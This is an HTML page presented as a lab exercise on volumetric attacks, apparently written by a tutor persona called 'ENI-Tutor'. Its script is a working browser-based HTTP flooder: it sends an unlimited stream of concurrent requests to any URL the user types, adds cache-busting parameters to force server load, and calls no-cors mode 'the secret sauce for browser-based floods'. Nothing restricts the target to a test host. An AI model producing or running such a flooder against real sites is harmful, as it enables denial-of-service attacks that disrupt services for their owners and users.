<!DOCTYPE html>
<html>
<head>
    <title>Lab Exercise: Network Stress Tester</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .panel { border: 1px solid #00ff00; padding: 20px; border-radius: 8px; max-width: 600px; margin: 0 auto; }
        input, button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px 0; width: 100%; }
        button:hover { background: #00ff00; color: #000; cursor: pointer; }
        #stats { margin-top: 20px; font-size: 0.8em; color: #ff0000; }
    </style>
</head>
<body>

<div class="panel">
    <h2>ENI-Tutor: Load Generator</h2>
    <p>Domain: "Understanding Volumetric Attacks"</p>
    
    <label>Target URL (include https://):</label>
    <input type="text" id="target" placeholder="https://example.com">
    
    <label>Threads (Concurrency):</label>
    <input type="number" id="threads" value="10">
    
    <button onclick="toggleStorm()" id="action-btn">INITIATE STORM</button>

    <div id="stats">
        Requests Sent: <span id="count">0</span><br>
        Status: <span id="status">IDLE</span>
    </div>
</div>

<script>
    let running = false;
    let requestCount = 0;
    const countDisplay = document.getElementById('count');
    const statusDisplay = document.getElementById('status');

    async function flood(target) {
        while (running) {
            try {
                // We add a random query parameter to bypass server-side caching
                // This forces the server to process the request instead of serving a cached copy
                const cacheBuster = `?t=${Math.random()}`;
                
                // 'no-cors' is the secret sauce for browser-based floods
                await fetch(target + cacheBuster, {
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                requestCount++;
                countDisplay.innerText = requestCount;
            } catch (err) {
                // Even if it fails, the request still hit the server's pipe
                requestCount++;
                countDisplay.innerText = requestCount;
            }
        }
    }

    function toggleStorm() {
        const btn = document.getElementById('action-btn');
        const target = document.getElementById('target').value;
        const threadCount = document.getElementById('threads').value;

        if (!running) {
            if (!target.startsWith('http')) {
                alert("Enter a full URL, Jonathan. Precision matters.");
                return;
            }
            running = true;
            btn.innerText = "HALT STORM";
            btn.style.borderColor = "#ff0000";
            btn.style.color = "#ff0000";
            statusDisplay.innerText = "STORMING...";

            for (let i = 0; i < threadCount; i++) {
                flood(target);
            }
        } else {
            running = false;
            btn.innerText = "INITIATE STORM";
            btn.style.borderColor = "#00ff00";
            btn.style.color = "#00ff00";
            statusDisplay.innerText = "IDLE";
        }
    }
</script>
</body>
</html>
